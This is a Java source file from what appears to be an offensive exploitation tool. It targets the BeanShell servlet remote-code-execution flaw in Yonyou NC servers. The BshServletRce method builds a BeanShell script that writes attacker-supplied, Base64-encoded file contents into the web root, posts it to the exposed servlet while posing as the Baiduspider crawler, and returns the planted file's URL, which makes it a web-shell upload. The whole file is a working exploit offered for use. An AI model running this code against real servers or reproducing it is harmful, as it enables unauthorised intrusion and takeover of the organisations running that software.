package vul;

import Util.HttpUtil;
import okhttp3.RequestBody;
import okhttp3.Response;

import java.io.IOException;
import java.net.Proxy;
import java.util.HashMap;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.Base64;


public class upload {

    public String uploadAction(String vulName, String url, String fileName, String fileData, Object proxy) throws IOException {
        String result;
        if ("ALL".equals(vulName)) {
            result = BshServletRce(url, fileName, fileData, proxy);
        } else if ("BshServlet rce".equals(vulName)) {
            result = BshServletRce(url, fileName, fileData, proxy);
        } else if ("All".equals(vulName)) {
            result = "请选择对应的漏洞";
        }else {
            result = "该漏洞暂不支持";
        }
        return result;

    }

    public String BshServletRce(String url, String fileName, String fileData, Object proxy) throws IOException {
        Map<String, String> headers = new HashMap<>();
        headers.put("User-Agent", "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)");
        String data = String.format("bsh.script=public static void writeExternalFile(){\n" +
                "  String filePath = \"webapps/nc_web/%s\";\n" +
                "  FileWriter writer;\n" +
                "try {\n" +
                "  writer = new FileWriter(filePath,true);\n" +
                "writer.write(new String((new sun.misc.BASE64Decoder()).decodeBuffer(\"%s\")));\n" +
                "  writer.write(\"\\r\\n\");\n" +
                "  writer.flush();\n" +
                "  writer.close();\n" +
                "}catch (IOException e){\n" +
                "  \n" +
                "  }\n" +
                "}\n" +
                "\n" +
                "writeExternalFile();", fileName, Base64.getEncoder().encodeToString(fileData.getBytes()));
        RequestBody body = RequestBody.create(data, okhttp3.MediaType.parse("application/x-www-form-urlencoded"));

        Response response = null;
        try {
            response = HttpUtil.post(url + "servlet/~ic/bsh.servlet.BshServlet", headers, body, (HttpUtil.ProxyConfig) proxy);
            String statusCode = String.valueOf(response.code());
            if ("200".equals(statusCode)) {
                return String.format("上传完毕，路径为：%s\n请自行检查文件是否上传成功", url + fileName);
            } else {
                return "接口不存在";
            }
        } catch (IOException e) {
            
            return "BshServlet rce 请求失败: " + e.getMessage();
        } finally {
            if (response != null) {
                response.close();
            }
        }
    }

}
